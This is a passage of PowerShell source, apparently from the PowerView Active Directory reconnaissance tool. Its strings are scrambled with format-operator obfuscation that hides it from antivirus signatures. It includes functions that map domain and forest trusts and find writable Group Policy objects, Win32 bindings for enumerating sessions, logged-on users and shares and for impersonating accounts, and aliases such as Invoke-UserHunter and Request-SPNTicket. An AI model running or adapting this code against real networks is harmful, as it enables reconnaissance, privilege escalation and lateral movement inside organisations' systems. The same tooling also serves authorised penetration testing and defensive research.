    if ($PSBoundParameters[("{2}{0}{1}{3}" -f 'a','rch','Se','Base')]) { $DomainTrustArguments[("{2}{3}{1}{0}"-f 'e','as','Search','B')] = $SearchBase }
    if ($PSBoundParameters[("{0}{1}" -f 'S','erver')]) { $DomainTrustArguments[("{1}{0}" -f'r','Serve')] = $Server }
    if ($PSBoundParameters[("{0}{1}{2}"-f'S','earch','Scope')]) { $DomainTrustArguments[("{2}{0}{1}" -f'archSc','ope','Se')] = $SearchScope }
    if ($PSBoundParameters[("{0}{2}{1}{3}"-f'Res','ltPageSi','u','ze')]) { $DomainTrustArguments[("{0}{3}{2}{1}"-f 'Res','geSize','Pa','ult')] = $ResultPageSize }
    if ($PSBoundParameters[("{0}{4}{2}{3}{1}"-f 'S','imit','r','TimeL','erve')]) { $DomainTrustArguments[("{2}{1}{0}{3}"-f'ver','er','S','TimeLimit')] = $ServerTimeLimit }
    if ($PSBoundParameters[("{1}{0}" -f'one','Tombst')]) { $DomainTrustArguments[("{2}{1}{3}{0}"-f'e','m','To','bston')] = $Tombstone }
    if ($PSBoundParameters[("{1}{0}{2}"-f'reden','C','tial')]) { $DomainTrustArguments[("{0}{2}{1}"-f'Creden','ial','t')] = $Credential }

    
    if ($PSBoundParameters[("{2}{0}{1}"-f 're','dential','C')]) {
        $CurrentDomain = (Get-Domain -Credential $Credential).Name
    }
    else {
        $CurrentDomain = (Get-Domain).Name
    }
    $Domains.Push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        
        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

            Write-Verbose ('[Get-DomainTrus'+'t'+'M'+'ap'+'ping] '+'Enu'+'me'+'rating'+' '+'tr'+'usts'+' '+'for'+' '+'do'+'main: '+"'$Domain'")

            
            $Null = $SeenDomains.Add($Domain, '')

            try {
                
                $DomainTrustArguments[("{1}{0}"-f'in','Doma')] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters[("{0}{1}" -f 'For','est')]) { $ForestTrustArguments[("{1}{0}"-f 'st','Fore')] = $Forest }
                    if ($PSBoundParameters[("{1}{2}{0}" -f 'l','Crede','ntia')]) { $ForestTrustArguments[("{1}{2}{0}{3}"-f 'e','C','r','dential')] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose ('[Get'+'-Dom'+'a'+'inTrustMapping]'+' '+'Err'+'or: '+"$_")
            }
        }
    }
}


function Get-GPODelegation {


    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @(("{1}{0}{2}"-f'YS','S','TEM'),("{4}{3}{1}{0}{2}"-f'i','m','ns','d','Domain A'),("{0}{2}{3}{1}"-f'E','Admins','nter','prise '))

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = ("{0}{1}"-f 'Subtre','e')
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match ("{1}{0}"-f'e','Writ') -and $_.AccessControlType -eq ("{1}{0}"-f'ow','All') -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne ("{2}{1}{0}"-f 'WNER','TOR O','CREA')}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty ("{0}{1}"-f'ADSPa','th') $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty ("{2}{0}{1}" -f'layNam','e','GPODisp') $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty ("{0}{3}{2}{1}" -f'I','eference','tityR','den') $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty ("{1}{4}{2}{0}{3}"-f 'ectoryRi','Acti','r','ghts','veDi') $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}











$Mod = New-InMemoryModule -ModuleName Win32




$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   ("{1}{0}{2}"-f '00','0x000','000')
    GROUP_OBJECT                    =   ("{0}{1}{2}"-f '0x10','0','00000')
    NON_SECURITY_GROUP_OBJECT       =   ("{1}{2}{0}"-f'001','0x100','00')
    ALIAS_OBJECT                    =   ("{2}{0}{1}{3}" -f'000','00','0x2','00')
    NON_SECURITY_ALIAS_OBJECT       =   ("{0}{2}{1}"-f'0','00001','x200')
    USER_OBJECT                     =   ("{2}{0}{3}{1}" -f 'x300','000','0','00')
    MACHINE_ACCOUNT                 =   ("{0}{1}{2}" -f'0x30','00','0001')
    TRUST_ACCOUNT                   =   ("{0}{1}{2}"-f'0x','30000','002')
    APP_BASIC_GROUP                 =   ("{0}{1}{2}{3}"-f'0','x','40','000000')
    APP_QUERY_GROUP                 =   ("{1}{2}{0}" -f '01','0x','400000')
    ACCOUNT_TYPE_MAX                =   ("{2}{1}{0}" -f 'ffffff','x7f','0')
}


$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   ("{1}{2}{0}" -f '001','0x0','0000')
    GLOBAL_SCOPE                    =   ("{0}{3}{1}{2}" -f'0x','00000','2','00')
    DOMAIN_LOCAL_SCOPE              =   ("{2}{0}{1}" -f'000','0004','0x0')
    UNIVERSAL_SCOPE                 =   ("{1}{2}{0}" -f'8','0x','0000000')
    APP_BASIC                       =   ("{2}{1}{0}" -f '10','00','0x0000')
    APP_QUERY                       =   ("{2}{0}{1}"-f '0002','0','0x000')
    SECURITY                        =   ("{1}{0}{2}"-f'8','0x','0000000')
} -Bitfield


$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield


$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}


$WTS_SESSION_INFO_1 = struct $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @(("{1}{0}"-f 'tr','LPWS'))
    pHostName = field 4 String -MarshalAs @(("{2}{1}{0}"-f 'WStr','P','L'))
    pUserName = field 5 String -MarshalAs @(("{0}{2}{1}"-f'LPW','tr','S'))
    pDomainName = field 6 String -MarshalAs @(("{1}{2}{0}"-f'r','LPW','St'))
    pFarmName = field 7 String -MarshalAs @(("{2}{0}{1}" -f'WSt','r','LP'))
}


$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @(("{3}{1}{0}{2}" -f 'rr','yValA','ay','B'), 20)
}


$SHARE_INFO_1 = struct $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @(("{1}{2}{0}" -f 'tr','L','PWS'))
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @(("{1}{0}{2}"-f 'WS','LP','tr'))
}


$WKSTA_USER_INFO_1 = struct $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @(("{0}{2}{1}"-f 'LP','Str','W'))
    LogonDomain = field 1 String -MarshalAs @(("{1}{0}"-f 'Str','LPW'))
    AuthDomains = field 2 String -MarshalAs @(("{1}{0}"-f'WStr','LP'))
    LogonServer = field 3 String -MarshalAs @(("{0}{1}{2}"-f'LPWS','t','r'))
}


$SESSION_INFO_10 = struct $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @(("{2}{0}{1}" -f'S','tr','LPW'))
    UserName = field 1 String -MarshalAs @(("{1}{0}"-f 'Str','LPW'))
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}


$SID_NAME_USE = psenum $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}


$LOCALGROUP_INFO_1 = struct $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @(("{0}{1}" -f'LPW','Str'))
    lgrpi1_comment = field 1 String -MarshalAs @(("{2}{1}{0}"-f 'Str','PW','L'))
}


$LOCALGROUP_MEMBERS_INFO_2 = struct $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $SID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @(("{1}{0}" -f'Str','LPW'))
}


$DsDomainFlag = psenum $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$DsDomainTrustType = psenum $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = psenum $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}


$DS_DOMAIN_TRUSTS = struct $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @(("{1}{0}"-f 'PWStr','L'))
    DnsDomainName = field 1 String -MarshalAs @(("{0}{1}"-f'L','PWStr'))
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $DsDomainTrustType
    TrustAttributes = field 5 $DsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}


$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @(("{2}{1}{0}"-f'WStr','P','L'))
    lpRemoteName =    field 5 String -MarshalAs @(("{1}{0}" -f 'Str','LPW'))
    lpComment =       field 6 String -MarshalAs @(("{1}{0}" -f'PWStr','L'))
    lpProvider =      field 7 String -MarshalAs @(("{0}{1}" -f 'LPWSt','r'))
}


$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace ("{0}{1}"-f 'Win3','2')
$Netapi32 = $Types[("{1}{2}{0}"-f'tapi32','n','e')]
$Advapi32 = $Types[("{2}{0}{1}"-f 'dvapi','32','a')]
$Wtsapi32 = $Types[("{0}{1}"-f'wts','api32')]
$Mpr = $Types['Mpr']
$Kernel32 = $Types[("{1}{0}{2}"-f 'r','ke','nel32')]

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData

